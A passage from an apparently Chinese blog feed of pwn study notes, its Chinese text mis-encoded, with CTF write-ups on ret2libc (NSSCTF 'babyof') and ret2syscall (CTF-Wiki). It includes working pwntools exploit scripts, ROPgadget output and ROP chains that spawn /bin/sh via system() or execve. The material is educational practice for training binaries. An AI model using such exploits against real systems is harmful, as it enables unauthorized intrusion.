0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°æ‰¾åˆ°äº†ï¼Œåœ°å€æ˜¯ 0x0000000000400506 å’Œ 0x0000000000400743ï¼Œä¹‹åå°±æ˜¯ç¼–å†™æ”»å‡»è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28230</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬ä¸€æ¬¡è°ƒç”¨putså‡½æ•°ï¼Œç„¶åæ³„éœ²putså‡½æ•°çš„çœŸå®åœ°å€</span></span><br><span class="line">ret = <span class="number">0x400506</span></span><br><span class="line">pop_rdi = <span class="number">0x400743</span></span><br><span class="line">func_vuln_addr = <span class="number">0x400632</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x40</span> + <span class="number">0x08</span>), pop_rdi, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], func_vuln_addr])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Do you know how to do buffer overflow?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;win\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¥æ”¶äº†putså‡½æ•°çš„çœŸå®åœ°å€ï¼Œljustä¹‹åå¯¹é½ï¼Œå†ç„¶åå°±æ˜¯é€šè¿‡u64æ‰“åŒ…</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)    <span class="comment">#è¿™ä¸ªå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å·²ç»æ³„éœ²äº†åœ°å€çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¯¥å‡½æ•°çš„åœ°å€</span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment">#ä½¿ç”¨dumpå‡½æ•°å¾—åˆ°ç›¸å¯¹äºåŸºåœ°å€çš„åç§»åœ°å€ï¼Œç„¶åå‡½æ•°çœŸå®åœ°å€-åç§»åœ°å€å¾—åˆ°åŸºåœ°å€</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x40</span> + <span class="number">0x08</span>), ret, pop_rdi, str_bin_sh, system_addr])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Do you know how to do buffer overflow?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹ä¸ºå•¥ç¬¬äºŒä¸ª payload éœ€è¦åŠ ä¸Šä¸€ä¸ª ret çš„åœ°å€ï¼Œå¤§ä½¬çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/bd744137c4ae4baab0a4b3f11265b4df.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å…¶å®å°±æ˜¯å¯¹äº Ubuntu18 æˆ–è€…æ›´é«˜çš„ç³»ç»Ÿï¼Œéœ€è¦å®Œæˆ 16 å­—èŠ‚å¯¹é½ï¼Œå¦åˆ™ä¼šç›´æ¥ç»ˆæ­¢ç¨‹åºã€‚</p><p>â€‹æœ€åï¼Œè¿è¡Œè„šæœ¬ï¼Œåœ¨é‚£ 10 ä¸ªç‰ˆæœ¬ä¸­é€‰æ‹©ï¼Œç›´åˆ°æ‹¿åˆ°æ­£ç¡®çš„ä¸ºæ­¢ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ3ï¼‰ret2syscall</title>
      <link href="/posts/e20e7502.html"/>
      <url>/posts/e20e7502.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°3"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°3">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ3ï¼‰</h1><h2 id="ropåŸç†"><a class="markdownIt-Anchor" href="#ropåŸç†">#</a> ROP åŸç†ï¼š</h2><p>â€‹ROP (Return Oriented Programming) è¿”å›å¯¼å‘ç¼–ç¨‹ï¼Œä¸»è¦æ€æƒ³æ˜¯é€šè¿‡åœ¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µï¼ˆgadgetsï¼‰æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><h2 id="æ ˆæº¢å‡ºret2syscall"><a class="markdownIt-Anchor" href="#æ ˆæº¢å‡ºret2syscall">#</a> æ ˆæº¢å‡ºâ€“ret2syscallï¼š</h2><h3 id="1ç³»ç»Ÿè°ƒç”¨"><a class="markdownIt-Anchor" href="#1ç³»ç»Ÿè°ƒç”¨">#</a> 1. ç³»ç»Ÿè°ƒç”¨ï¼š</h3><p>â€‹å¯¹äºä¸€ä¸ªå·²ç»å­˜åœ¨äºæ ‡å‡†åº“ä¸­çš„å‡½æ•°ï¼Œä¾‹å¦‚ printf ()ï¼Œæˆ‘ä»¬ç¼–å†™æŸä¸ªç¨‹åºçš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°ä»…ä»…åªç”¨äº† printf (å‚æ•°); è¿™ä¹ˆä¸€è¡Œï¼Œä½†æ˜¯ï¼Œå…¶å·¥ä½œå¯æ˜¯å¾ˆå¤æ‚çš„ï¼Œprintf () è°ƒç”¨äº†å‡½æ•°åº“å½“ä¸­çš„å…¶ä»–æ›´åŠ åº•å±‚çš„å‡½æ•°ï¼Œç„¶åè¢«è°ƒç”¨çš„å‡½æ•°è‚¯å®šä¼šè°ƒç”¨å†åº•å±‚çš„å‡½æ•°ï¼ŒçŸ¥é“è°ƒç”¨åˆ°ç³»ç»Ÿè°ƒç”¨ä¸­çš„ write () å‡½æ•°ä¸ºæ­¢ï¼›ç”±ä¸Šå¯çŸ¥ï¼Œä»»ä½•ä¸€ä¸ªå‡½æ•°æƒ³è¦å®ŒæˆæŸæ ·å·¥ä½œï¼Œéƒ½å¿…é¡»è¦ç»è¿‡ç³»ç»Ÿè°ƒç”¨æ¥æ“ä½œç¡¬ä»¶æ‰èƒ½å¤ŸæˆåŠŸã€‚</p><p>â€‹åœ¨ Linux ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨é€šå¸¸é€šè¿‡ int 80h è¿™ä¸€æ±‡ç¼–ä»£ç å®ç°ï¼Œint è¡¨ç¤ºçš„æ˜¯ç»ˆç«¯ï¼Œinterruptï¼Œ80h åˆ™æ˜¯ä»£æŒ‡çš„ç³»ç»Ÿè°ƒç”¨çš„ç»ˆç«¯ç¬¦å·ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ° int 80h è¿™ä¸€ä»£ç çš„æ—¶å€™ï¼Œå°±ä¼šå°†ç›¸åº”çš„é€šç”¨å¯„å­˜å™¨ eax ä¸­çš„å‚æ•°ä½œä¸ºç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨å·ï¼Œå…¶ä»–å¯„å­˜å™¨ä¸­çš„å€¼æˆ–è€…åœ°å€æ‰€æŒ‡å‘çš„å€¼ä½œä¸ºå‚æ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)   <span class="comment">//ï¼ˆ32ä½ç¨‹åºï¼‰</span></span><br></pre></td></tr></table></figure><p>â€‹è¯¥å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 11ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve </span><br></pre></td></tr></table></figure><p>è¿›è¡ŒæŸ¥è¯¢ï¼Œé‚£ä¹ˆï¼Œå¦‚æœæƒ³è¦è°ƒç”¨ execve () å‡½æ•°ï¼Œå°±éœ€è¦æå‰è®©ç›¸åº”çš„é€šç”¨å¯„å­˜å™¨ç½®äºæ­£ç¡®çš„å€¼ï¼Œè¿™æ ·æ‰èƒ½è¿›è¡Œæ­£ç¡®çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥éœ€è¦è®©ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eax=0xb</span><br><span class="line"></span><br><span class="line">ebx=/bin/sh çš„åœ°å€</span><br><span class="line"></span><br><span class="line">ecx=0</span><br><span class="line"></span><br><span class="line">edx=0</span><br></pre></td></tr></table></figure><h3 id="2é¢˜ç›®ç¤ºä¾‹ctf-wikipwn-ret2syscall"><a class="markdownIt-Anchor" href="#2é¢˜ç›®ç¤ºä¾‹ctf-wikipwn-ret2syscall">#</a> 2. é¢˜ç›®ç¤ºä¾‹ï¼ˆctf-Wikiâ€”pwn-ret2syscallï¼‰ï¼š</h3><p>â€‹é¦–å…ˆåº”è¯¥æ£€æµ‹ç¨‹åºçš„ä¿æŠ¤ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹å‡ºï¼Œç¨‹åºæ˜¯ä¸€ä¸ª 32 ä½å°ç«¯åºä¹‹å¼€å¯äº† NX ä¿æŠ¤çš„ç¨‹åºï¼Œä¹‹åç”¨ IDA é™æ€è°ƒè¯•ä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œä»æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºçš„é¢˜ç›®ï¼Œå±é™©å‡½æ•°å¾ˆæ˜æ˜¾ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨åˆ°ï¼Œä¹‹åï¼Œç±»ä¼¼äºä¹‹å‰çš„åšæ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾— v4 ç›¸å¯¹äº ebp çš„åç§»ä¸º 108ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è¦†ç›–çš„è¿”å›åœ°å€ç›¸å¯¹äº v4 çš„åç§»ä¸º 112ã€‚æ­¤æ¬¡ï¼Œç”±äºæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­çš„æŸä¸€æ®µä»£ç æˆ–è€…è‡ªå·±å¡«å†™ä»£ç æ¥è·å¾— shellï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç¨‹åºä¸­çš„ gadgets æ¥è·å¾— shellï¼Œè€Œå¯¹åº”çš„ shell è·å–åˆ™æ˜¯åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>â€‹å› æ­¤ï¼Œæ¥ä¸‹æ¥ï¼Œéœ€è¦è¾¾æˆçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå°±æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œå°±éœ€è¦æŒ‰ç…§å¦‚ä¸‹çš„æ–¹å¼æ¥ç½®ä½æ­£ç¡®çš„å¯„å­˜å™¨çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º 0xb</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ /bin/sh çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º 0</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</span><br></pre></td></tr></table></figure><p>â€‹é‚£ä¹ˆï¼Œèƒ½å¤Ÿç›´æ¥æ“ä½œå¯„å­˜å™¨çš„åˆ™æ˜¯æ±‡ç¼–ä»£ç ï¼Œå› æ­¤ï¼Œåˆ™éœ€è¦ä½¿ç”¨ ROPgadget å·¥å…·æ¥å¯»æ‰¾ç›¸å…³çš„ä»£ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>â€‹ä»¥åŠï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">âœ  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ‰¾åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åå°±æ˜¯ /bin/sh çš„åœ°å€äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">âœ  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>â€‹æœ€ååˆ™æ˜¯ int 80h çš„åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">âœ  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>â€‹åƒè¿™æ ·ï¼ŒæŒ‰ç…§å¯„å­˜å™¨ä»¥åŠå€¼çš„å…³ç³»ï¼Œä¾æ¬¡å°†å¯„å­˜å™¨ç½®ä½æ­£ç¡®çš„å€¼ï¼Œä¹‹åæ‰§è¡Œ int 80hï¼Œå³å¯è¾¾åˆ°æ­£ç¡®çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç›¸åº”çš„è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./rop&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnå­¦ä¹ ç¬”è®°ï¼ˆ2ï¼‰--ret_2_text_or_shellcode</title>
      <link href="/posts/c3c1bd42.html"/>
      <url>/posts/c3c1bd42.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°2"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°2">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ2ï¼‰</h1><h2 id="1ä¸‰ç§å¸¸è§çš„å¯„å­˜å™¨"><a class="markdownIt-Anchor" href="#1ä¸‰ç§å¸¸è§çš„å¯„å­˜å™¨">#</a> 1. ä¸‰ç§å¸¸è§çš„å¯„å­˜å™¨ï¼š</h2><p>â€‹ax å¯„å­˜å™¨ï¼šé€šç”¨å¯„å­˜å™¨ï¼Œå¯ç”¨äºå­˜æ”¾å¤šç§æ•°æ®</p><p>â€‹bp å¯„å­˜å™¨ï¼šå­˜æ”¾çš„æ˜¯æ ˆå¸§çš„æ ˆåº•åœ°å€</p><p>â€‹sp å¯„å­˜å™¨ï¼šå­˜æ”¾çš„æ˜¯æ ˆé¡¶çš„åœ°å€</p><h2 id="2æ ˆå¸§ä¸æ ˆå·¥ä½œçš„ç®€ä»‹"><a class="markdownIt-Anchor" href="#2æ ˆå¸§ä¸æ ˆå·¥ä½œçš„ç®€ä»‹">#</a> 2. æ ˆå¸§ä¸æ ˆå·¥ä½œçš„ç®€ä»‹ï¼š</h2><p>â€‹æ ˆå¸§æ˜¯å­˜å‚¨å‡½æ•°çš„ä¸€äº›ä¿¡æ¯çš„åœ°æ–¹ï¼Œæ ˆå¸§å­˜å‚¨æœ‰å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œä¼ é€’ç»™å­å‡½æ•°çš„å®é™…å‚æ•°ï¼Œçˆ¶å‡½æ•°çš„åœ°å€ä»¥åŠä¸Šä¸€ä¸ªæ ˆå¸§æ ˆåº•çš„åœ°å€ï¼Œå¤§è‡´æƒ…å†µå¦‚ä¸‹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/fb7f5e074f454da6b1459fd822dc9036.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åœ¨å‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆä¼šè®² bp å¯„å­˜å™¨çš„å€¼è¿›è¡Œå‹æ ˆï¼Œä»¥æ–¹ä¾¿åœ¨æ¢å¤çš„æ—¶å€™æ¢å¤æ ˆåº•å¯„å­˜å™¨çš„å€¼ï¼Œå†ä¹‹åï¼Œä¼šæŒ‰é¡ºåºå°†å±€éƒ¨å˜é‡å‹æ ˆï¼Œæœ€åæ˜¯å­å‡½æ•°çš„å®é™…å‚æ•°ï¼Œä¼šæŒ‰ç…§å…ˆå…¥æ ˆçš„åå‡ºæ ˆï¼Œä»æœ€åä¸€ä¸ªå®é™…å‚æ•°å…ˆå…¥æ ˆå†åˆ°ç¬¬ä¸€ä¸ªå®é™…å‚æ•°ï¼Œæ¯”å¦‚å‡½æ•° a (int a , int b)ï¼Œå‹æ ˆçš„æ–¹å¼å°±æ˜¯å…ˆå‹æ ˆ b çš„å®é™…å‚æ•°ï¼Œå†å‹æ ˆ a çš„å®é™…å‚æ•°ï¼Œå½“è¿™äº›å‹æ ˆå®Œæˆä¹‹åï¼Œå°±å¯ä»¥å‹æ ˆçˆ¶å‡½æ•°è°ƒç”¨å­å‡½æ•°çš„é‚£æ¡è¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥çš„åœ°å€ï¼Œç´§æ¥ç€ï¼Œå¯ä»¥å‹æ ˆå½“å‰æ ˆå¸§çš„æ ˆåº•åœ°å€äº†ã€‚</p><p>â€‹å…·ä½“çš„æ±‡ç¼–è¯­è¨€å®ç°å°±ä¸å¤šåšè§£é‡Šäº†ï¼Œå› ä¸ºæˆ‘è¿™é‡Œåªæ˜¯ç®€è¿°ã€‚</p><h2 id="3ç¼“å†²åŒºæº¢å‡ºæ¼æ´"><a class="markdownIt-Anchor" href="#3ç¼“å†²åŒºæº¢å‡ºæ¼æ´">#</a> 3. ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼š</h2><p>â€‹ç¼“å†²åŒºæº¢å‡ºæ¥¼å“¦å¯¹é‚£ä¸ªçš„æœ¬è´¨å°±æ˜¯å‘å®šé•¿çš„ç¼“å†²åŒºä¸­å†™å…¥äº†è¶…é•¿çš„æ•°æ®ï¼Œé€ æˆäº†å†™å…¥çš„æ•°æ®è¦†ç›–äº†å…¶ä»–åˆæ³•çš„å†…å­˜åŒºåŸŸã€‚</p><h2 id="4æ ˆæº¢å‡ºä¹‹ret2text"><a class="markdownIt-Anchor" href="#4æ ˆæº¢å‡ºä¹‹ret2text">#</a> 4. æ ˆæº¢å‡ºä¹‹â€“ret2textï¼š</h2><h3 id="1åŸç†"><a class="markdownIt-Anchor" href="#1åŸç†">#</a> ï¼ˆ1ï¼‰åŸç†ï¼š</h3><p>â€‹ret2text åº”è¯¥æ˜¯æœ€ç®€å•çš„æ ˆæº¢å‡ºæ¼æ´åˆ©ç”¨çš„æ–¹å¼ä¹Ÿæ˜¯æœ€ç®€å•çš„ï¼š</p><p>â€‹å‡è®¾ï¼Œåœ¨æ ˆä¸­ï¼Œå­˜åœ¨å¦‚ä¸‹æƒ…å†µï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/ee2c57b57c254a6fb3f6f4edb0e9391b.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹</p><p>å…¶ C ç¨‹åºæºä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 